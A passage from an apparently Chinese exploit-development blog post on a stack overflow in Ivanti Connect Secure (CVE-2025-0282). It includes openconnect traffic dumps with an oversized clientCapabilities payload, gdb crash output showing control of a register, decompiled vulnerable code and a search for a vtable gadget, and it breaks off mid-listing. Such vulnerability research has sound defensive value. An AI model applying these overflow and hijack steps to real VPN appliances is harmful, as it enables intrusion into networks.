class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">$ ./openconnect 172.16.64.222 --protocol=pulse --dump-http-traffic -vvv</span><br><span class="line">Attempting to connect to server 172.16.64.222:443</span><br><span class="line">Connected to 172.16.64.222:443</span><br><span class="line">SSL negotiation with 172.16.64.222</span><br><span class="line">Server certificate verify failed: signer not found</span><br><span class="line"></span><br><span class="line">Certificate from VPN server &quot;172.16.64.222&quot; failed verification.</span><br><span class="line"><span class="attribute">Reason</span><span class="punctuation">: </span>signer not found</span><br><span class="line">To trust this server in future, perhaps add this to your command line:</span><br><span class="line">    --servercert pin-sha256:4fW+U987xNSV4e/eojrHz/Cr1pGxIIF0lraaXwBKQ2A=</span><br><span class="line">Enter &#x27;yes&#x27; to accept, &#x27;no&#x27; to abort; anything else to view: yes</span><br><span class="line">Connected to HTTPS on 172.16.64.222 with ciphersuite (TLS1.2)-(RSA)-(AES-256-GCM)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 172.16.64.222</span><br><span class="line">&gt; User-Agent: Open AnyConnect VPN Agent v9.12-unknown</span><br><span class="line">&gt; Content-Type: EAP</span><br><span class="line">&gt; Upgrade: IF-T/TLS 1.0</span><br><span class="line">&gt; Content-Length: 0</span><br><span class="line">&gt;</span><br><span class="line">Got HTTP response: HTTP/1.1 101 Switching Protocols</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>IF-T/TLS 1.0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line">HC_HMAC_VERSION_COOKIE: 1</span><br><span class="line"><span class="attribute">supportSHA2Signature</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=31536000</span><br><span class="line"><span class="attribute">accept-ch</span><span class="punctuation">: </span>Sec-CH-UA-Platform-Version</span><br><span class="line">&gt; 0000:  00 00 55 97 00 00 00 01  00 00 00 14 00 00 00 00  |..U.............|</span><br><span class="line">&gt; 0010:  00 01 02 02                                       |....|</span><br><span class="line">Read 20 bytes of IF-T/TLS record</span><br><span class="line">&lt; 0000:  00 00 55 97 00 00 00 02  00 00 00 14 00 00 01 f5  |..U.............|</span><br><span class="line">&lt; 0010:  00 00 00 02                                       |....|</span><br><span class="line">IF-T/TLS version from server: 2</span><br><span class="line">&gt; 0000:  00 00 0a 4c 00 00 00 88  00 00 06 a1 00 00 00 01  |...L............|</span><br><span class="line">&gt; 0010:  63 6c 69 65 6e 74 48 6f  73 74 4e 61 6d 65 3d 75  |clientHostName=u|</span><br><span class="line">&gt; 0020:  62 75 6e 74 75 20 63 6c  69 65 6e 74 49 70 3d 31  |buntu clientIp=1|</span><br><span class="line">&gt; 0030:  39 38 2e 31 39 2e 32 34  39 2e 31 38 38 20 63 6c  |98.19.249.188 cl|</span><br><span class="line">&gt; 0040:  69 65 6e 74 43 61 70 61  62 69 6c 69 74 69 65 73  |ientCapabilities|</span><br><span class="line">&gt; 0050:  3d 31 39 38 2e 31 39 2e  32 34 39 2e 31 38 38 41  |=198.19.249.188A|</span><br><span class="line">&gt; 0060:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0070:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0080:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0090:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 00f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0100:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0110:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0120:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0130:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0140:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0150:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0160:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0170:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0180:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0190:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 01f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0200:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0210:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0220:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0230:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0240:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0250:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0260:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0270:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0280:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0290:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 02f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0300:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0310:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0320:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0330:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0340:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0350:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0360:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0370:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0380:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0390:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 03f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0400:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0410:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0420:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0430:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0440:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0450:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0460:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0470:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0480:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0490:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 04f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0500:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0510:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0520:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0530:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0540:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0550:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0560:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0570:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0580:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0590:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05a0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05b0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05c0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05d0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05e0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 05f0:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0600:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0610:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0620:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0630:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0640:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0650:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0660:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0670:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0680:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|</span><br><span class="line">&gt; 0690:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 0a  |AAAAAAAAAAAAAAA.|</span><br><span class="line">&gt; 06a0:  00                                                |.|</span><br><span class="line">Read 20 bytes of IF-T/TLS record</span><br><span class="line">&lt; 0000:  00 00 55 97 00 00 00 05  00 00 00 14 00 00 01 f6  |..U.............|</span><br><span class="line">&lt; 0010:  00 0a 4c 01                                       |..L.|</span><br><span class="line">&gt; 0000:  00 00 55 97 00 00 00 06  00 00 00 22 00 00 00 02  |..U........&quot;....|</span><br><span class="line">&gt; 0010:  00 0a 4c 01 02 01 00 0e  01 61 6e 6f 6e 79 6d 6f  |..L......anonymo|</span><br><span class="line">&gt; 0020:  75 73                                             |us|</span><br></pre></td></tr></table></figure><p>可以看到构超级长的 <code>ientCapabilities</code> 参数的时候就会栈溢出</p><p>free 的 崩溃现场</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">eax            0x0      0</span><br><span class="line">edi            0xff856370       -8035472</span><br><span class="line">esi            0x1      1</span><br><span class="line">edx            0xf1a8d004       -240594940</span><br><span class="line">&#x3D;&gt; 0xf4f73d1d &lt;free+45&gt;:        mov    esi,DWORD PTR [ecx-0x4]</span><br><span class="line">   0xf4f73d20 &lt;free+48&gt;:        lea    edx,[ecx-0x8]</span><br><span class="line">   0xf4f73d23 &lt;free+51&gt;:        test   esi,0x2</span><br><span class="line">   0xf4f73d29 &lt;free+57&gt;:        jne    0xf4f73d58 &lt;free+104&gt;</span><br><span class="line">   0xf4f73d2b &lt;free+59&gt;:        and    esi,0x4</span><br><span class="line">0xff856110:     0x56723200      0x566dd509      0x566ecbc7      0xf4f73cf8</span><br><span class="line">0xff856120:     0xf7a26000      0x00000001      0xff856370      0xf6d6535f</span><br><span class="line">0xff856130:     0x41414141      0x00000032      0xf7f3abc9      0x5671d000</span><br><span class="line">0xff856140:     0x5671d000      0x56723200      0x00000001      0x5669a4e8</span><br><span class="line">0xff856150:     0xff856370      0x00000289      0x566ed87c      0x566d7c7f</span><br><span class="line">0xf4f73d1d in free () from &#x2F;lib&#x2F;libc.so.6</span><br><span class="line">(gdb) bt</span><br><span class="line">#0  0xf4f73d1d in free () from &#x2F;lib&#x2F;libc.so.6</span><br><span class="line">#1  0xf6d6535f in DSUtilMemPool::~DSUtilMemPool() () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line">#2  0x5669a4e8 in ?? ()</span><br><span class="line">#3  0x5669ae7b in ?? ()</span><br><span class="line">#4  0xf5fd0565 in IftTlsParser::parse(unsigned char const*, unsigned int) () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsagentd.so</span><br><span class="line">#5  0xf5fd084e in IftTlsParser::parseData(unsigned char const*, unsigned int) () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsagentd.so</span><br><span class="line">#6  0x56696e48 in ?? ()</span><br><span class="line">#7  0x566133d5 in ?? ()</span><br><span class="line">#8  0x56614446 in ?? ()</span><br><span class="line">#9  0x56614d40 in ?? ()</span><br><span class="line">#10 0xf6c4942e in ?? () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line">#11 0xf6c49f2f in DSEvntFds::runDispatcher() () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line">#12 0x5663f477 in ?? ()</span><br><span class="line">#13 0x565e0a37 in main ()</span><br><span class="line">(gdb) p&#x2F;x 0x5669a4e8  - $base</span><br><span class="line">$1 &#x3D; 0xe54e8</span><br><span class="line">(gdb) i er ecx</span><br><span class="line">Undefined info command: &quot;er ecx&quot;.  Try &quot;help info&quot;.</span><br><span class="line">(gdb) i r ecx</span><br><span class="line">ecx            0x41414141       1094795585</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl EPMessage::~EPMessage(EPMessage *this)</span><br><span class="line">&#123;</span><br><span class="line">  DSHash::~DSHash((EPMessage *)((char *)this + 4));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0xf6d0fb31 in DSHash::~DSHash() () from &#x2F;home&#x2F;ecbuilds&#x2F;int-rel&#x2F;sa&#x2F;22.7&#x2F;bld3431.1&#x2F;install&#x2F;lib&#x2F;libdsplibs.so</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line"><span class="built_in">strncpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">char</span> *)a1-&gt;clientCapabilities, v23);<span class="comment">// overflow</span></span><br><span class="line">v24 = <span class="number">46</span>;</span><br><span class="line">v25 = &amp;v57;</span><br><span class="line"><span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)&amp;v57 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  LOBYTE(v24) = <span class="number">44</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v25 = (__int16 *)&amp;v58;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="number">4</span> * (v24 &gt;&gt; <span class="number">2</span>));</span><br><span class="line">v26 = &amp;v25[<span class="number">2</span> * (v24 &gt;&gt; <span class="number">2</span>)];</span><br><span class="line"><span class="keyword">if</span> ( (v24 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  *v26 = <span class="number">0</span>;</span><br><span class="line">na = <span class="number">46</span>;</span><br><span class="line">(*(<span class="keyword">void</span> (__cdecl **)(struct_a1 *, __int16 *))(*(_DWORD *)a1-&gt;gap0 + <span class="number">72</span>))(a1, &amp;v57);</span><br></pre></td></tr></table></figure><p>在溢出之后有一个函数指针的调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [esp+0A0Ch+var_9E0]</span><br><span class="line">mov     eax, [esp+2576]</span><br><span class="line">mov     eax, [eax]</span><br><span class="line">mov     [esp+0A0Ch+src], edx</span><br><span class="line">; 395:     na &#x3D; 46;</span><br><span class="line">mov     edx, [esp+0A0Ch+arg_0]</span><br><span class="line">mov     [esp+0A0Ch+n], 2Eh ; &#39;.&#39; ; int</span><br><span class="line">mov     [esp+0A0Ch+var_A0C], edx</span><br><span class="line">call    dword ptr [eax+48h]</span><br></pre></td></tr></table></figure><p>这里是一个this 指针调用虚表函数的功能， 由于虚表指针在栈上， 这个栈是可以被我们覆盖的， 所以我们大概率就是需要找到一个虚表指针，他指向的虚表函数表， 这个表 +0x48 能有合适的gadget， 我一开始的思路是去找所有的虚表定义，看看有没有合适的， 可惜我没有找到， 于是我回到 <a href="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/">https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/</a> 这个文章<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/ ">[2]</span></a></sup>，观察这个作者的 <code>A Gadget From The Gods</code> ， 最后我用的大概率也是做这个找到的这个gadget<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-7ebb63e11446ebcb90d9700b46299a8b-cf5a79.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-01-15-7ebb63e11446ebcb90d9700b46299a8b-cf5a79.png" alt="image.png"></a></p><p>在这文章<sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/ ">[2]</span></a></sup>中作者提到了他的 gadget 的具体汇编，第一句是<code>mov ebx, 0xfffffff0 </code>， 第二句是 <code>add esp, 0x204C</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 